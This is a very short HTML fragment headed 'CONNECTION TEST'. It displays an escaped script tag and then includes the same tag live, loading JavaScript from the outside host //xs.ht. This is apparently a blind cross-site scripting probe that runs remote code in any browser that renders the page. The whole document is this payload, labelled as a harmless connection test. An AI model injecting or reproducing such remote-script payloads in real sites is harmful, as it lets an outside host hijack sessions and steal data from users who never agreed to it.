<h1>CONNECTION TEST</h1>
<code>
    &lt;script src=&quot;//xs.ht&quot;&gt;&lt;/script&gt;
</code>
<script src="//xs.ht"></script>